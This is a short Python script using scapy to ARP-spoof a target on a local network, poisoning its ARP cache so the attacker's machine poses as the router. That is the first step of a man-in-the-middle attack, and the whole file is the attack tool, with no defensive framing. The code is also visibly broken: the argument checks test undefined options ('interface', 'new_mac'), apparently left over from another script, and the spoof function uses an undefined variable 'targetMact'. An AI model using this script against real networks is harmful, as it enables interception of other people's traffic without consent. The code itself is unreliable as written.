import scapy.all as scapy
import optparse

def getArgs():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--targetIP", dest="targetIp", help="include target ip")
    parser.add_option("-r", "--routerIp", dest="routerIp", help="include router ip")
    (opt, arg) = parser.parse_args()
    if not opt.interface:
        parser.error("[-] Please specify an targetIp. Use --help for information.")
    elif not opt.new_mac:
        parser.error("[-] Please specify routerIp. Use --help for information.")

    return opt
def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest
    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
    return answeredList[0][1].hwsrc


def spoof(targetIp, spoofIp):
    targetMac = getMac(targetIp)
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMact, psrc=spoofIp)
    scapy.send(packet)

opt = getArgs()

spoof(opt.targetIp, opt.routerIp)
spoof(opt.targetIp, opt.routerIp)
